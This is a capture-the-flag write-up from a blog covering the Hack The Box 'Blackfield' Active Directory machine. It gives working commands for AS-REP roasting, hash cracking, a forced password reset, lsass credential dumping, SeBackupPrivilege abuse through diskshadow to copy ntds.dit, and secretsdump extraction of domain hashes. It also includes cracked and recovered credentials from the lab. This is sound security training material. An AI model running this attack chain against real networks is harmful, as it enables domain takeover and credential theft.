---
title: Hackthebox - Blackfield
description: this is my first blog using vuepress
tag:
    - Hard
    - Active Directory
---

![](/assets/img/blackfield/cover-blackfield.png)

### Portscan

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-05 01:20:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-05T01:20:44
|_  start_date: N/A
```

### Reconaissance

Doing ldap enumeration doesn't show me the way, so i keep move onto RPC.
RPC sucessfull login with guest as user without password, but i cannot use command such as `enumdomusers`,`enumdomains`.
unfortunetly when i used `smbclient` tools without -U and -N i able to see list share about this target with password empty.

![](/assets/img/blackfield/1.png)

in this case we cannot able to list forensic share but when we check the profiles$ share, we've got bunch of username list. This is great because with this list we can perfrom AS-REP Roasting, this technique include KERBEROASTING Methodology.


> KERBEROASTING is stealling service account password and crack them offline with wordlist.


![](/assets/img/blackfield/2.png)

After get those names, use script from impacket GetNPusers.py with following command :

`GetNPUsers.py BLACKFIELD.local/ -usersfile usernames.txt -format hashcat -dc-ip 10.10.10.192 -outputfile AS-REP`

```bash
┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]
└──╼ #cat AS-REP 
$krb5asrep$23$support@BLACKFIELD.LOCAL:17bc70e610b036b35661ef81b9d57219$13aceded8bab3f6f2c6dd3252f562fb896a2940519ca82e31467833a818521d68d85169e37aa9e772c483454199a9d8cf588585b65522a85a294283b8288cc74ab0c9406bf60cb30174dd9ff95c78c72e02bcea4f047d0f0a59ccbc5ffbd314b8f26f63dd2ce409517d4e4489dc5b66203222eef34a70c00c49e30bdd3af2520c854d0dbbdf1ade21cdb9bd8e566c06d16d8e374b8004f76ec46f9e08700afd8ab4fc2c27231bdb79778f7468eb0cc089d5a0aa7dfabaa63fe2dd77d63154d73344e5e003a816e2cc6435082b25be46740356205a44940876089ffcf81f1ff5b9ac2d1e3cb474a1d9d99a8f8a99a7f0aff805300
```

as you can see we able to steal support account from target, now crack this NTLM with hashcat using module 18200.

`hashcat -m 18200 -a 0 AS-REP ~/Desktop/htb-tool/rockyou.txt`

![](/assets/img/blackfield/3.png)

notif from hashcat successfully crack the hash with status cracked, now im gonna going to forensic share using this creds.

`support:#00^BlackKnight`

![](/assets/img/blackfield/4.png)

we still dont have an access for this share, im gonna use [Bloodhound.py](https://github.com/fox-it/BloodHound.py) this script for AD environtment so we can gather information from target with this script.

`./bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all`

![](/assets/img/blackfield/5.png)

after that turn on the bloodhound and neo4j , because we need to find what power support as user inside target. 

![](/assets/img/blackfield/6.png)

Binggo!! we found what we need in this time, user support can change password for audit2020. RPC has change password fitur, we can take advantages of this service, im gonna change password `audit2020` to `Password123` because when i set this password needed integer.

![](/assets/img/blackfield/7.png)

After change the password i move into smb share again for check if audit2020 has permission into their share or not.

![](/assets/img/blackfield/8.png)

So far so good tho!! so i tried to looking what inside this shares until i found lsass.zip.
what is LSASS ?

:::tip
Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens
:::

use this command below if you get trouble when download this zip file.

`smbget -R smb://audit2020:'Password123'@10.10.10.192/forensic/memory_analysis/lsass.zip`

after unzip this lsass.zip i found file lsass.dmp, actually we can dump this file using [pypykatz](https://github.com/skelsec/pypykatz). 

```bash
┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]
└──╼ #ls | grep lsass.
lsass.DMP
lsass.zip
```

for dumping all this information exec command below :

`pypykatz lsa  minidump lsass.DMP -o dump.txt`

i've got so much information contains NTLM hash, but luckily i found hash for svc_backup then use evilwin-rm to login with hash as svc_backup. Beside i found administrator NTLM hash too but i think it's not gonna work.

```bash
┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]                                                                           
└──╼ #cat dump.txt
[..] 
Username: svc_backup
Domain: BLACKFIELD
LM: NA
NT: 9658d1d1dcd9250115e2205d9f48400d
SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
DPAPI: a03cd8e9d30171f3cfe8caad92fef621
[..]
Username: svc_backup
```

![](/assets/img/blackfield/9.png)

### Privilege Escalation

in privilege information sections i found `SeBackupPrivilege` and `SeRestorePrivilege`, this privilege is highly vulnerable because we can backup anything from server such as `NDTS.dit`,`Security Account Manager(SAM)`.

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
[..]

```

:::danger
SeBackupPrivilege privilege, the user can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.  
This privilege causes the system to grant all read access control to any file, regardless of the [_access control list_](https://docs.microsoft.com/en-us/windows/win32/secgloss/a-gly#_security_access_control_list_gly) (ACL) specified for the file. Any access request other than read is still evaluated with the ACL. The following access rights are granted if this privilege is held:  
READ\_CONTROL  
ACCESS\_SYSTEM\_SECURITY  
FILE\_GENERIC\_READ  
FILE\_TRAVERSE
:::

Now we can start the explotation of this privilege, firtsly add script below and given name script.txt, we can take advantages of diskshadow binary.

```text
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  
 
create  
  
expose %mydrive% w:  
end backup  
```

run `diskshadow /s script.txt` command will execute the script.txt, then you can clone [this repo](https://github.com/giuliano108/SeBackupPrivilege) and upload into target.

```bash
#evil-winrm
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll

# import module cmdlets

Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
```

here's the fun part!! we're gonna backup NTDS.dit from W drive that we create early to `C:\temp`. After that you can download `ntds.dit` and `system` into host. 

```bash
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\temp\ntds.dit -Overwrite
reg save HKLM\SYSTEM c:\temp\system
```

last but not least use secretdumps.py to extract all information with following command :

`secretsdump.py -ntds ntds.dit -system system -just-dc LOCAL`

```bash{9}
┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]                                                                                                                                                        
└──╼ #secretsdump.py -ntds ntds.dit -system system -just-dc LOCAL                 
Impacket v0.9.23.dev1+20210421.100825.fea485d2 - Copyright 2020 SecureAuth Corporation 
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393           
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c 
[*] Reading and decrypting hashes from ntds.dit                                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f4a13e41e3ae7a47a76323a4c6ef8e33:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
```

like a charm!!! now we can use NTLM hash using evil-winrm as Administrator.... then collect root.txt

![](/assets/img/blackfield/10.png)


### Referencess

```text
https://hashcat.net/wiki/doku.php?id=example_hashes
https://malicious.link/post/2017/reset-ad-user-password-with-linux/
https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
```